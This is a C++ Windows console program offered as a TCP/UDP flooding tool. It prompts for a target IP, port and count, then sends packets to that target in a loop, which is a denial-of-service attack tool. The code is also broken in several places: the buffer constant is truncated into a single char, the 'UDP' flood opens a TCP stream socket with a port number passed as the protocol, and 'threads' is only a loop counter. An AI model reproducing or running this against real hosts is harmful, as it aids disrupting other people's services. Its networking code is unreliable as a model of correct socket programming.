#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <WinSock2.h>
#include <string>

#pragma comment(lib, "Ws2_32.lib")

#define sendbuf 65536;
	
void TCPFlood(char* ip, int port, int threads) {

	WSADATA wsa;
	SOCKET s;
	sockaddr_in addr;

	WSAStartup(MAKEWORD(2, 2), &wsa);
	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	
	addr.sin_addr.S_un.S_addr = inet_addr(ip);


	if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {

		std::cout << "There was an Error. Errorcode: " << WSAGetLastError() << std::endl;
		Sleep(1000);
		std::cout << "Console closes in: " << std::endl;
		Sleep(1000);
		std::cout << "3 " << std::endl;
		Sleep(1000);
		std::cout << "2 " << std::endl;
		Sleep(1000);
		std::cout << "1 " << std::endl;
		Sleep(1000);
		closesocket(s);
		WSACleanup();
		exit(0);
	}
	else {

		std::cout << "Socket launched!" << std::endl;
		char data = sendbuf;
		for (int i = 0; i <= threads; i++) {
			
			send(s, &data, sizeof(data), 0);
		
			std::cout << i << " : Data sended to >> " << ip << " : " << port << std::endl;
			
			if (i == threads) {
				Sleep(1000);
				std::cout << "Console closes in: " << std::endl;
				Sleep(1000);
				std::cout << "3 " << std::endl;
				Sleep(1000);
				std::cout << "2 " << std::endl;
				Sleep(1000);
				std::cout << "1 " << std::endl;
				Sleep(1000);
				closesocket(s);
				WSACleanup();
				exit(0);
			}
		}
		
		
	}



}


void UDPFlood(char* ip, int port, int threads) {

	WSADATA wsa;
	SOCKET s;
	sockaddr_in addr;

	WSAStartup(MAKEWORD(2, 2), &wsa);
	s = WSASocket(AF_INET, SOCK_STREAM, IPPORT_BIFFUDP, NULL, (unsigned int)NULL, (unsigned int)NULL);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);

	addr.sin_addr.S_un.S_addr = inet_addr(ip);


	if (WSAConnect(s, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {

		std::cout << "There was an Error. Errorcode: " << WSAGetLastError() << std::endl;
		Sleep(1000);
		std::cout << "Console Close in: " << std::endl;
		Sleep(1000);
		std::cout << "3 " << std::endl;
		Sleep(1000);
		std::cout << "2 " << std::endl;
		Sleep(1000);
		std::cout << "1 " << std::endl;
		Sleep(1000);
		closesocket(s);
		WSACleanup();
		exit(0);
	}
	else {

		std::cout << "Socket launched!" << std::endl;
		char data = sendbuf;
		for (int i = 0; i <= threads; i++) {
			std::string str = "Hallo!";
			send(s, &data, sizeof(data), 0);

			std::cout << i << " : Data sended to >> " << ip << " : " << port << std::endl;

			if (i == threads) {
				Sleep(1000);
				std::cout << "Console closes in: " << std::endl;
				Sleep(1000);
				std::cout << "3 " << std::endl;
				Sleep(1000);
				std::cout << "2 " << std::endl;
				Sleep(1000);
				std::cout << "1 " << std::endl;
				Sleep(1000);
				closesocket(s);
				WSACleanup();
				exit(0);
			}
		}


	}



}
int main() {

	int port;
	char ip[16];
	int threads;
	std::string type;

	std::cout << "UDP Flood / TCP Flood: ";
	std::cin >> type;
	std::cout << "IP: ";
	std::cin >> ip;
	std::cout << "Port: ";
	std::cin >> port;
	std::cout << "Num of Threads: ";
	std::cin >> threads;


	std::cout << "Starting Flood." << std::endl;
	Sleep(1000);
	std::cout << "Starting Flood.." << std::endl;
	Sleep(1000);
	std::cout << "Starting Flood..." << std::endl;
	Sleep(1000);

	
	if (type == "UDP" || type == "udp") {
		UDPFlood(ip, port, threads);

	}if (type == "TCP" || type == "tcp") {
	
		TCPFlood(ip, port, threads);
	}
	else {
		std::cout << "Flood Type not found. Pls use TCP or UDP." << std::endl;
		Sleep(1000);
		std::cout << "Console Close in: " << std::endl;
		Sleep(1000);
		std::cout << "3 " << std::endl;
		Sleep(1000);
		std::cout << "2 " << std::endl;
		Sleep(1000);
		std::cout << "1 " << std::endl;
		Sleep(1000);
	
		exit(0);
	}

	
	

}